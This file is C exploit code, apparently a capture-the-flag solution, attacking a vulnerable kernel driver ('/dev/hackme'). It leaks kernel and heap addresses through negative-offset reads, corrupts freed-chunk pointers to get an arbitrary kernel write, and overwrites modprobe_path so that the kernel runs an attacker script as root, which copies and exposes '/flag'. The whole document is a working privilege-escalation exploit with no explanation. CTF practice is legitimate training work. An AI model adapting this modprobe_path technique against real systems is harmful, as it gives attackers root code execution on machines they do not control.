#include <fcntl.h>

#define REQ_CREATE 0x30000
#define REQ_DELETE 0x30001
#define REQ_READ   0x30003
#define REQ_WRITE  0x30002

struct command {
    unsigned int index;
    unsigned int unused;
    char *buffer;
    long size;
    long offset;
};

int ioctl(int fd, unsigned long request, unsigned long param) {
    return syscall(16, fd, request, param);
}

void create_entry(int fd, int id, int size, char *init_buffer) {
    struct command command;
    
    command.index = id;
    command.buffer = init_buffer;
    command.size = size;

    ioctl(fd, REQ_CREATE, &command);
}

void delete_entry(int fd, long id) {
    struct command command;

    command.index = id;

    ioctl(fd, REQ_DELETE, &command);
}

void read_entry(int fd, int id, char *dest, int offset, int size) {
    struct command command;

    command.index = id;
    command.size = size;
    command.buffer = dest;
    command.offset = offset;

    ioctl(fd, REQ_READ, &command);
}

void write_entry(int fd, int id, char *src, int offset, int size) {
    struct command command;

    command.index = id;
    command.size = size;
    command.buffer = src;
    command.offset = offset;

    ioctl(fd, REQ_WRITE, &command);
}

void log(char *msg) {
    printf("[+] %s\n", msg);
}

void error(char *msg) {
    printf("[-] %s\n", msg);
    exit(-1);
}

long read_neg_address(int fd, int idx, int offset) {
    char payload[1000];

    read_entry(fd, idx, &payload, offset, -offset);

    long *result = (long*)payload;

    return *result;
}

void write_neg_address(int fd, int idx, int offset, long value) {
    char payload[1000];

    long* pPayload =(long*)payload;

    *pPayload = value;

    write_entry(fd, idx, payload, offset, -offset);
}

int main(int argc, char *argv) {
    int fd;
    char payload[0x1000];
    long* pBuffer = (long*)payload;

    memset(payload, 0x0, 0x100);    
    
    log("Open hackme device...");
    fd = open("/dev/hackme", O_RDONLY);

    if (fd == -1) 
        error("[-] Failed to open hackme device");        

    log("Create initial files for modprobe_path exploit");

    system("echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh");
    system("chmod +x /home/pwn/copy.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/dummy");
    system("chmod +x /home/pwn/dummy");

    create_entry(fd, 0, 0x100, payload);
    create_entry(fd, 1, 0x100, payload);
    create_entry(fd, 2, 0x100, payload);
    create_entry(fd, 3, 0x100, payload);
    create_entry(fd, 4, 0x100, payload);

    log("Delete some channels for leaking...");
    delete_entry(fd, 1);
    delete_entry(fd, 3);

    long heap_leak = read_neg_address(fd, 4, -0x100);
    long kernel_leak = read_neg_address(fd, 0, -0xd0);
    long table_ptr = kernel_leak - 0x38ad0;
    long modprobe_path = table_ptr + 0x2e950; 

    printf("Heap leak         : %p\n", heap_leak);
    printf("Kernel leak       : %p\n", kernel_leak);
    printf("Table ptr         : %p\n", table_ptr);
    printf("Modprobe path     : %p\n", modprobe_path);

    log("Fix heap bins (in order for execve to succeed)...");
    *pBuffer = heap_leak;

    write_entry(fd, 0, payload, 0, 8);
    write_entry(fd, 2, payload, 0, 8);
    write_entry(fd, 4, payload, 0, 8);

    log("Overwrite FD pointer to allocate chunk near pool address...");
    write_neg_address(fd, 4, -0x100, table_ptr+0x30);

    log("Allocate 2 chunks to get a chunk in kernel...");
    create_entry(fd, 5, 0x100, payload);
    create_entry(fd, 6, 0x100, payload);

    log("Read pool address from new chunk...");
    long table_addr = read_neg_address(fd, 6, -0x30);

    printf("Table address     : %p\n", table_addr);

    log("Prepare next chunk corruption...");
    delete_entry(fd, 2);
    delete_entry(fd, 4);
    delete_entry(fd, 5);

    memset(payload, 0x0, 0x1000);

    create_entry(fd, 1, 0x100, payload);
    create_entry(fd, 2, 0x100, payload);
    create_entry(fd, 3, 0x100, payload);

    log("Free chunks...");
    delete_entry(fd, 3);
    delete_entry(fd, 2);
    
    log("Overwrite freed FD with pool pointer");
    write_neg_address(fd, 1, -0x100, table_addr+0xc8);

    create_entry(fd, 2, 0x100, payload);
    create_entry(fd, 3, 0x100, payload);
    
    log("Overwrite pool with payload...");
    long** pPayload = (long**)payload;
    
    pPayload[0] = table_addr+0xc8;              
    pPayload[1] = 0x200;
    pPayload[2] = modprobe_path;
    pPayload[3] = 0x100;

    create_entry(fd, 4, 0x100, payload);

    log("Overwrite modprobe string...");
    write_entry(fd, 1, "/home/pwn/copy.sh\x00", 0, 18);

    log("Trigger modprobe string to copy flag...");
    system("/home/pwn/dummy");
    system("cat /home/pwn/flag");
    
    close(fd);

    return 0;
}